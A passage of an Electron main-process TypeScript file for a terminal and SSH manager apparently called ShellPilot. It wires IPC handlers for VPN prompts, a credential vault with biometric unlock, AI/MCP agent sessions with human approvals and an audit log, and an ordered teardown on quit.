    } catch (e) {
      return toVpnResult(e)
    }
  }
)
ipcMain.handle('vpn:logs', (_e, id: string, limit?: number) => vpnLogs(id, limit))
ipcMain.handle('vpn:dependents', (_e, id: string) => vpnDependentsOf(id))
// Log lines stop at the ring buffer unless a drawer is open. Refcounted, so
// two windows watching the same profile do not silence each other.
ipcMain.on('vpn:log-subscribe', (e, id: string) => {
  vpnAttachRenderer(e.sender)
  vpnSubscribeLogs(id)
})
ipcMain.on('vpn:log-unsubscribe', (_e, id: string) => vpnUnsubscribeLogs(id))

// One-time codes and password re-prompts, mirroring the SSH prompter above.
const pendingVpnPrompts = new Map<string, (value: string | null) => void>()
ipcMain.on('vpn:prompt-reply', (_e, id: string, value: string | null) => {
  const resolve = pendingVpnPrompts.get(id)
  if (!resolve) return
  pendingVpnPrompts.delete(id)
  resolve(value)
})
setVpnPrompter((req) => {
  const target = mainWindow
  // No window means nobody can answer. Returning null is the same outcome as
  // the user dismissing the dialog, which the drivers already handle; the
  // alternative is a connection that hangs forever with no explanation.
  if (!target || target.isDestroyed()) return Promise.resolve(null)
  return new Promise<string | null>((resolve) => {
    pendingVpnPrompts.set(req.id, resolve)
    target.webContents.send('vpn:prompt', req)
    // A one-time code the user walked away from must not pin a connection
    // open indefinitely.
    setTimeout(() => {
      if (pendingVpnPrompts.delete(req.id)) resolve(null)
    }, 120000)
  })
})

// ---- Vault ----
ipcMain.handle('vault:status', () => vaultStatus())
ipcMain.handle('vault:create', (_e, password: string) => vaultCreate(password))
// Every unlock path re-arms background checking.
//
// The sampler stops when the vault locks — correctly, it cannot resolve a
// credential — but nothing was telling it the vault had come back, so it stayed
// stopped and the settings pane told the user to turn the feature off and on
// again. That is a workaround for a missing wire, not a remedy, and shipping it
// as instructions was worse than the bug.
//
// `resume()` is idempotent, so each path calls it without coordinating.
const resumeChecksAfterUnlock = (r: { ok: boolean }): { ok: boolean } => {
  if (r.ok) fleetSampler.resume()
  return r
}

ipcMain.handle('vault:unlock', async (_e, password: string) =>
  resumeChecksAfterUnlock(await vaultUnlock(password))
)
// Auto-lock needs the renderer told, or the UI keeps showing an unlocked vault
// it can no longer read. The biometric session key goes with it.
setVaultAutoLock(15, () => {
  forgetSessionKey()
  if (mainWindow && !mainWindow.isDestroyed()) mainWindow.webContents.send('vault:auto-locked')
})

ipcMain.handle('vault:lock', () => {
  // A session-scoped biometric key must not outlive the unlocked state, or
  // "lock" would not mean locked.
  forgetSessionKey()
  return vaultLock()
})
ipcMain.handle('vault:list', () => vaultList())
ipcMain.handle('vault:save', (_e, entries: VaultEntry[]) => vaultSave(entries))
// The stored biometric key was derived from the old password and cannot open
// the re-encrypted vault, so it is cleared here rather than left to fail on
// the next unlock. The renderer re-reads bio-enabled after this and tells the
// user to set it up again.
ipcMain.handle('vault:change-password', async (_e, current: string, next: string) => {
  const result = await vaultChangePassword(current, next)
  if (result.ok) disableBiometricUnlock()
  return result
})
ipcMain.handle('vault:destroy', () => {
  // A stored biometric key opens a vault that no longer exists; leaving it
  // behind is dead material on disk.
  disableBiometricUnlock()
  return vaultDestroy()
})

// ---- Vault: biometric unlock ----
ipcMain.handle('vault:bio-support', () => biometricSupport())
ipcMain.handle('vault:bio-enabled', () => biometricEnabled())
ipcMain.handle('vault:bio-enable', (_e, scope: 'session' | 'persistent' = 'session') =>
  enableBiometricUnlock(scope)
)
ipcMain.handle('vault:bio-scope', () => biometricScope())
ipcMain.handle('vault:set-auto-lock', (_e, minutes: number) => setVaultAutoLock(minutes))
ipcMain.handle('vault:bio-disable', () => disableBiometricUnlock())
ipcMain.handle('vault:bio-unlock', async () => resumeChecksAfterUnlock(await biometricUnlock()))

// ---- Workspace locks ----
ipcMain.handle('wslock:ids', () => wsLockIds())
ipcMain.handle('wslock:verify', (_e, id: string, password: string) => wsLockVerify(id, password))
ipcMain.handle('wslock:set', (_e, id: string, password: string, current?: string) =>
  wsLockSet(id, password, current)
)
ipcMain.handle('wslock:remove', (_e, id: string, current: string) => wsLockRemove(id, current))
ipcMain.handle('wslock:delete', (_e, id: string) => wsLockDelete(id))

// ---- Secrets ----
ipcMain.handle('secrets:available', () => secretsAvailable())
ipcMain.handle('secrets:set', (_e, id: string, value: string) => setSecret(id, value))
ipcMain.handle('secrets:delete', (_e, id: string) => deleteSecret(id))

// ---- Data persistence ----
ipcMain.handle('data:load', () => loadData())
ipcMain.handle('data:save', (_e, data: unknown) => {
  saveData(data)
  // The local terminal's kill switch is a renderer setting, but a renderer-side
  // flag stops only the honest UI — a compromised renderer would call
  // local.connect() directly and never read it. So main keeps its own copy,
  // refreshed from the same blob, and every local:* handler consults that.
  syncLocalTerminalEnabled(data)
  // Same pattern, same reason: a module that gates a background probe has to be
  // read by the process that runs the probe. See syncAccessModule.
  syncAccessModule(data)
  // The MCP bridge resolves friendly server/workspace names from this same
  // file (see mcpDataCache.ts) rather than round-tripping through the
  // renderer on every tool call, so its cache is refreshed right after the
  // write that would otherwise make it stale.
  refreshMcpDataCache(data)
})

// ---- AI & MCP: access groups ----
ipcMain.handle('aiPolicy:listGroups', () => listGroups())
ipcMain.handle('aiPolicy:createGroup', (_e, name: string) => createGroup(name))
ipcMain.handle('aiPolicy:saveGroup', (_e, group: AccessGroup) => saveGroup(group))
ipcMain.handle('aiPolicy:deleteGroup', (_e, id: string) => deleteGroup(id))
ipcMain.handle('aiPolicy:listAssignments', () => listAssignments())
ipcMain.handle('aiPolicy:setAssignment', (_e, scope: PolicyAssignment['scope'], groupId: string | null) =>
  setAssignment(scope, groupId)
)
ipcMain.handle('aiPolicy:removeAssignment', (_e, id: string) => removeAssignment(id))
ipcMain.handle('aiPolicy:listServerMeta', () => listServerMeta())
ipcMain.handle('aiPolicy:setServerAliases', (_e, serverId: string, aliases: string[]) =>
  setServerAliases(serverId, aliases)
)

// ---- AI & MCP: server/workspace directory (read-only view for the UI) ----
ipcMain.handle('aiPolicy:listWorkspaces', () => listCachedWorkspaces())
ipcMain.handle('aiPolicy:listServers', (_e, workspaceId?: string) => listCachedServers(workspaceId))

// ---- AI & MCP: global config + server lifecycle ----
ipcMain.handle('aiMcp:getConfig', () => getMcpConfig())
ipcMain.handle('aiMcp:setConfig', async (_e, patch: Partial<McpGlobalConfig>) => {
  const next = setMcpConfig(patch)
  if (next.enabled && mcpServerStatus().running === false) {
    const result = await startMcpServer()
    if (!result.ok) return { config: next, error: result.error }
  } else if (!next.enabled) {
    await stopMcpServer()
  }
  return { config: next }
})
ipcMain.handle('aiMcp:status', () => mcpServerStatus())

// ---- AI & MCP: agent sessions ----
ipcMain.handle('aiMcp:createSession', (_e, input: CreateSessionInput) => createSession(input))
ipcMain.handle('aiMcp:listSessions', () => listSessions())
ipcMain.handle('aiMcp:revokeSession', (_e, id: string) => revokeSession(id))
ipcMain.handle('aiMcp:deleteSession', (_e, id: string) => deleteSession(id))
ipcMain.handle('aiMcp:setSessionGroup', (_e, id: string, groupId: string | null, groupName: string) =>
  setSessionGroup(id, groupId, groupName)
)
ipcMain.handle('aiMcp:explainAccess', (_e, sessionId: string, serverId: string | null) =>
  explainSessionAccess(sessionId, serverId)
)
ipcMain.handle('aiMcp:killAllSessions', () => {
  const count = killAllSessions()
  const denied = denyAllPending()
  return { revoked: count, denied }
})

// ---- AI & MCP: approvals ----
ipcMain.handle('aiMcp:listApprovals', () => listPendingApprovals())
ipcMain.handle('aiMcp:respondApproval', (_e, id: string, decision: 'approved' | 'denied') =>
  respondToApproval(id, decision)
)
onApprovalEvent((e) => {
  if (mainWindow && !mainWindow.isDestroyed()) mainWindow.webContents.send('ai:approval-event', e)
  if (e.type === 'created') notifyApprovalPending(e.request)
  // Stop the taskbar flashing once the thing it was flashing about is answered.
  if (e.type === 'resolved' && mainWindow && !mainWindow.isDestroyed()) mainWindow.flashFrame(false)
})

// ---- AI & MCP: agent-initiated server creation (the add_server tool) ----
// Same request/reply shape as ssh:prompt above: the renderer owns the
// connection list, so main hands it the work and waits for the answer.
let createSeq = 0
const pendingServerCreates = new Map<string, (result: AgentServerResult) => void>()

ipcMain.on('aiMcp:create-server-reply', (_e, id: string, result: AgentServerResult) => {
  const resolve = pendingServerCreates.get(id)
  if (!resolve) return
  pendingServerCreates.delete(id)
  resolve(result)
})

setAgentServerCreator((req: AgentServerRequest) => {
  const target = mainWindow
  if (!target || target.isDestroyed()) {
    return Promise.resolve({ ok: false, error: 'The ShellPilot window is closed.' })
  }
  const id = `mkserver-${createSeq++}`
  return new Promise<AgentServerResult>((resolve) => {
    pendingServerCreates.set(id, resolve)
    target.webContents.send('aiMcp:create-server', { id, request: req })
    // The agent is blocked on this call; never leave it hanging on a renderer
    // that failed to answer.
    setTimeout(() => {
      if (pendingServerCreates.delete(id)) resolve({ ok: false, error: 'Timed out adding the server.' })
    }, 30000)
  })
})

// ---- AI & MCP: one-click client wiring (AI & MCP -> Overview -> Connect) ----
ipcMain.handle('aiMcp:claudeCodeCommand', (_e, token: string, port: number) => claudeCodeCommand(token, port))
ipcMain.handle('aiMcp:writeClaudeDesktopConfig', (_e, token: string, port: number) =>
  writeClaudeDesktopConfig(token, port)
)
ipcMain.handle('aiMcp:writeCodexConfig', (_e, token: string, port: number) => writeCodexConfig(token, port))

// ---- AI & MCP: CLI pairing (the `shellpilot claude|codex|run` launcher) ----
ipcMain.handle('aiMcp:cancelPairing', (_e, id: string) => cancelCliPairing(id))
onCliPairingEvent((e) => {
  if (mainWindow && !mainWindow.isDestroyed()) mainWindow.webContents.send('ai:pairing-event', e)
})

// ---- AI & MCP: audit log ----
ipcMain.handle('aiMcp:listAudit', (_e, limit?: number) => listAudit(limit))

// Teardown became asynchronous when VPN engines arrived: they are separate
// processes and killing them is not instantaneous. The order below is the
// point — every consumer dies before the transport it was riding, so nothing
// observes a half-dead network on the way out.
//
// The re-entry guard exists because preventDefault + app.exit() means this
// handler fires twice on some platforms, and running the dispose functions
// twice is at best noisy.
let teardownStarted = false
app.on('before-quit', (e) => {
  if (teardownStarted) {
    // Still prevent the default. Without this, the second fire (Cmd+Q twice,
    // or the platforms where this handler runs twice by itself) quits
    // immediately while the first invocation's vpnDisposeAll is still inside
    // its 4s window — so engines die by process death instead of by the
    // graceful ladder, and a system-mode tunnel never puts the routes and DNS
    // back. The single app.exit(0) below is what ends the process.
    e.preventDefault()
    return
  }
  teardownStarted = true
  e.preventDefault()

  // Before sshDisposeAll, not after: both of these hold pooled connections and
  // should hand their references back while the pool is still there to take
  // them. The comments were also the wrong way round — each now sits above what
  // it describes.
  //
  // A following journalctl keeps a channel open past the window.
  logTailer.disposeAll()
  // Queued hosts must not start after the window is gone.
  broadcast.disposeAll()
  // Same for a job. Its rows stay; adopt() closes them as abandoned at the next
  // launch, which is the truth about what the attached path just did to them.
  jobRunner.disposeAll()
  sshDisposeAll()
  localDisposeAll()
  sftpDisposeAll()
  // After the sampler, which is the only writer: closing the database out from
  // under an in-flight sweep would be a caught-and-logged failure rather than a
  // crash, but it would also silently drop the sweep the user just paid for.
  //
  // dispose() stops the loop synchronously and hands back the sweep that was
  // already in flight. That sweep persists what it collected in its own
  // finally, AFTER dispose() returns, so closing here without waiting drops the
  // last sweep of every session — the exact thing the paragraph above says must
  // not happen.
  //
  // Bounded, though. An in-flight sweep can be parked on an SSH exec against a
  // host that has stopped answering, and quitting must not wait on the network:
  // after HISTORY_LAST_SWEEP_MS the store closes anyway, and a sweep that lands
  // later is dropped by the store's own guard, which says so on the console.
  // Closing is what folds the WAL back into the primary, so it has to happen on
  // every quit rather than only on the fast ones.
  const lastSweep = fleetSampler.dispose().catch(() => undefined)
  if (historyRetain) clearInterval(historyRetain)
  const sweepDeadline = new Promise<void>((resolve) => setTimeout(resolve, HISTORY_LAST_SWEEP_MS))
  const historyClosed = Promise.race([lastSweep, sweepDeadline]).then(() => historyStore?.close())
  metricsDisposeAll()
  dbDisposeAll()
  tunnelDisposeAll()
  externalEditDisposeAll()
  vaultDispose()
  void stopMcpServer()

  // Dependents are down; now the transports. Hard-capped, because a wedged
  // child must never be able to hold the app open — an orphan is reaped on the
  // next launch, an app that will not quit is a support ticket.
  const cap = new Promise<void>((resolve) => setTimeout(resolve, 4000))
  void Promise.race([
    Promise.all([vpnDisposeAll().catch(() => undefined), historyClosed]),
    cap
  ]).finally(() => app.exit(0))
})

// Safety net: never let a stray async error (e.g. a failed child_process
// spawn) crash the main process with a fatal dialog.
process.on('uncaughtException', (err) => console.error('[uncaughtException]', err))
process.on('unhandledRejection', (reason) => console.error('[unhandledRejection]', reason))

// The window is frameless, so no menu bar is drawn — but an application menu
// still has to exist for the clipboard accelerators (Ctrl/Cmd+C, V, X, A) to
// reach focused inputs. Without it, copy and paste silently do nothing.
function installMenu(): void {
  const isMac = process.platform === 'darwin'
  const menu = Menu.buildFromTemplate([
    ...(isMac ? [{ role: 'appMenu' as const }] : []),
    {
      label: 'Edit',
      submenu: [
        { role: 'undo' as const },
        { role: 'redo' as const },
        { type: 'separator' as const },
        { role: 'cut' as const },
        { role: 'copy' as const },
        { role: 'paste' as const },
        { role: 'pasteAndMatchStyle' as const },
        { role: 'delete' as const },
        { role: 'selectAll' as const }
      ]
    },
    {
      label: 'View',
      submenu: [
        // No 'reload' role. Its Ctrl+R accelerator is swallowed app-wide and
        // shells bind Ctrl+R to reverse history search — losing that, and
        // having every open terminal torn down by an accidental reload, is far
        // worse than not having a reload menu item.
        { role: 'toggleDevTools' as const, accelerator: 'F12' },
        { type: 'separator' as const },
        // No zoom roles: Ctrl +/-/0 resize the terminal font instead, and the
        // menu accelerators would otherwise zoom the whole UI at the same time.
        { role: 'togglefullscreen' as const }
      ]
    },
    // No 'Window' submenu. Its two roles carry CmdOrCtrl+M and CmdOrCtrl+W
    // accelerators, which the menu consumes before the renderer sees them —
    // that swallowed Close Tab and Open Fleet Monitor. The frameless title bar
    // already provides minimize/close buttons, and Alt+F4 still works.
  ])
  if (isMac) Menu.setApplicationMenu(menu)
  else {
    // Keep the accelerators, keep the bar hidden.
    Menu.setApplicationMenu(menu)
    BrowserWindow.getAllWindows().forEach((w) => w.setMenuBarVisibility(false))
  }
}

// A second instance would share the same data files and silently clobber the
// first one's state — last writer wins. Focus the existing window instead.
if (!app.requestSingleInstanceLock()) {
  app.quit()
} else {
  app.on('second-instance', () => {
    if (!mainWindow || mainWindow.isDestroyed()) return
    if (mainWindow.isMinimized()) mainWindow.restore()
    mainWindow.focus()
  })
}

app.whenReady().then(() => {
  installCsp()
  // Only the instance that won the single-instance lock gets here, which is the
  // whole reason the store is opened from inside whenReady rather than at
  // module scope. See startHistory.
  startHistory()
  // After startHistory, so the first sweep has a store to read; before
  // createWindow, so a rule does not wait on a window it never needs. The
  // engine's first sweep sets its watermark to "now" and acts on nothing
  // behind it, so starting it early cannot replay a backlog.
  ruleEngine.start()
  createWindow()
  installMenu()
  // Primed once at launch so the MCP bridge can resolve server/workspace
  // names even before the renderer's first data:save call.
  refreshMcpDataCache()
  // Same reasoning for the local terminal's kill switch: the renderer may open a
  // shell before its first data:save, so main reads the persisted setting itself
  // rather than starting from a default it would later have to correct.
  syncLocalTerminalEnabled(loadData())
  // Before the MCP server: the bridge asks the manager what is running, and a
  // bridge that answered "nothing" because the manager had not booted would be
  // lying about the state of the user's network. This also reaps any engine a
  // previous run left behind, before anything tries to claim its ports.
  // A laptop that has been asleep comes back on a different path, and
  // sometimes a different network entirely. WireGuard roams by itself but its
  // reported handshake age is stale until we resample; OpenVPN can sit on a
  // dead socket for minutes waiting for its own ping-restart. Nudging both is
  // cheaper than either.
  powerMonitor.on('resume', () => vpnHandleWake())
  powerMonitor.on('unlock-screen', () => vpnHandleWake())

  void vpnInit()
    .catch((e) => console.error('[vpn] init failed:', e))
    .finally(() => {
      if (!getMcpConfig().enabled) return
      void startMcpServer().then((r) => {
        if (!r.ok) console.error('[mcp] failed to start on launch:', r.error)
      })
    })
  // Quiet by design: this only ever pushes a status event the renderer can
  // choose to surface (or not) — it never interrupts anything on its own.
  // The launch check and the recurring one are the same decision, made from
  // the stored prefs, so both live behind startAutoCheck rather than a bare
  // check here plus a timer somewhere else.
  startAutoCheck()
  // Scheduled backups. Started here rather than at module scope for the same
  // reason startHistory is: only the instance that won the single-instance
  // lock should be writing to a destination, and two copies of this app
  // uploading generations into the same bucket would fight over retention.
  //
  // The tick only looks at the clock. Nothing runs until a destination has an
  // interval AND a vault entry holding its passphrase, and a tick that cannot
  // find one records why rather than doing nothing.
  startBackupSchedule({
    onRun: (line) => console.log('[backup]', line),
    // Raised outside the window, because the panel that shows the failure is
    // three clicks into Settings and nobody goes there to check that a backup
    // they set up months ago is still working. Only on the transition into
    // failing: an hourly notification about the same broken destination is
    // noise, and noise is how a failing backup becomes one nobody reads.
    onNewFailure: (report) => {
      if (!Notification.isSupported()) return
      const n = new Notification({
        title: `Backup to ${report.destinationName} failed`,
        body: `${report.failedStage ? BACKUP_STAGE_LABEL[report.failedStage] : 'the run'}: ${report.error ?? 'no reason given'}`,
        icon: appIcon()
      })
      n.on('click', () => {
        if (mainWindow && !mainWindow.isDestroyed()) {
          if (mainWindow.isMinimized()) mainWindow.restore()
          mainWindow.focus()
        }
      })
      n.show()
    }
  })
  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow()
  })
})

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit()
})
